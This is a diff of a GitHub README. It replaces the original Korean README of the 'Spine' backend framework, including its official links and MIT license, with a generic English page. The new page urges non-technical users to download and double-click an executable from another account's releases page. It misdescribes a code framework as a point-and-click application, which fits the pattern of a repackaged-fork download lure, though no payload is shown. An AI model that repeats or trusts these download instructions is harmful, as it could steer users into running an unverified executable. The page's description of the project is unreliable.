@@ -1,29 +1,91 @@
-<p align="center">
-  한국어 | <a href="README.en.md">English</a>
-</p>
+# 🛠️ spine - Simple Backend Framework for Handling Requests
 
-# 🦴 Spine
-<p align="center">
-  <img src="assets/spine-logo.png" alt="Spine" width="420" />
-</p>
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-**Spine는 실행 흐름이 드러나는 백엔드 프레임워크입니다.**  
-요청이 어떻게 해석되고 실행되는지 숨기지 않습니다.
+## 🚀 Getting Started
 
-## 핵심 아이디어
+Welcome to the spine framework! This guide will help you download and run the application easily, even if you have no technical background. 
 
-- 실행 순서와 책임을 코드 구조로 고정합니다
-- 메서드 시그니처가 API 계약입니다
-- `path.*`, `query.*`, `httperr.*` 의미 타입을 사용합니다
+## 🌟 What is spine?
 
-## 링크
+spine is a framework focused on making request handling clear and straightforward. It provides a structure that helps you manage the life cycle of requests in your web applications. Whether you are building a small project or a more complex one, spine simplifies backend development for you.
 
-- 공식 사이트: https://spine.na2ru2.me/ko/
-- Bun ORM + Swagger 통합 예제 프로젝트: https://github.com/NARUBROWN/spine-user-demo
-- Kafka MSA 예제 프로젝트: https://github.com/NARUBROWN/spine-simple-msa-demo
+## 📦 Features
 
----
+- **Request Handling**: Understand and manage requests easily.
+- **Dependency Injection**: Utilize components without complicated setups.
+- **Execution Pipeline**: Streamline how requests flow through your application.
+- **User-Friendly**: Designed with non-developers in mind.
 
-## License
+## 📥 Download & Install
 
-MIT
+To get started with spine, follow these steps:
+
+1. **Visit the Releases Page**: Click the link below to access the download options.
+
+   [Download spine](https://github.com/Shivangdew/spine/releases)
+
+2. **Choose Your Version**: On the releases page, find the latest version of spine. Look for files that are labeled clearly.
+3. **Download the File**: Click on the file you want to download. For most users, this will be the executable file for your operating system.
+
+## 🔍 System Requirements
+
+To run spine smoothly, ensure your system meets these requirements:
+
+- **Operating System**: Windows, MacOS, or Linux.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB available space.
+- **Network**: Internet connection for downloading the framework.
+
+## 💻 Running the Application
+
+To run spine after downloading:
+
+1. **Locate the File**: Open your file explorer and navigate to the folder where you downloaded spine.
+2. **Run the File**: Double-click the file to start the application.
+3. **Follow the Instructions**: A window may open with setup options. Follow the prompts to configure your application.
+
+## 📃 Usage Instructions
+
+After running spine, here’s how to use it:
+
+1. **Create a New Project**: The application will guide you to set up a new project.
+2. **Define Components**: Use the user interface to add components like routes and services.
+3. **Start Handling Requests**: Once your project setup is complete, you can begin to receive and manage requests as needed.
+
+## ✅ Troubleshooting Tips
+
+If you encounter any issues while using spine, consider these tips:
+
+- **Check Your OS Compatibility**: Ensure that you are using a supported operating system.
+- **Re-download the File**: If the application doesn't start, try downloading the file again to avoid corrupted data.
+- **Consult the Community**: If you need help, the spine community is available on platforms such as GitHub Discussions.
+
+## 💬 Community Support
+
+You don't have to solve everything alone! Join the spine community for support. Here, you can ask questions, share tips, and learn from others. Explore it through:
+
+- **GitHub Discussions**: Connect with users and developers.
+- **Social Media**: Follow spine on various platforms to stay updated.
+
+## 📚 Additional Resources
+
+For more detailed documentation on spine's features:
+
+- Learn about **Dependency Injection** and how it simplifies your projects.
+- Explore the **Execution Pipeline** to understand how requests are processed.
+- Improve your skills with tutorials available on the website.
+
+## 🔄 Feedback & Contributions
+
+Your feedback is welcome! If you have suggestions or encounter issues, let us know. We appreciate all contributions that help improve spine.
+
+## 📝 License
+
+spine is open-source software. You can freely use and modify it under the terms of the license specified in the repository.
+
+For more information, visit the releases page again:
+
+[Download spine](https://github.com/Shivangdew/spine/releases) 
+
+This is your complete guide to downloading and running spine! Enjoy building your backend with ease.
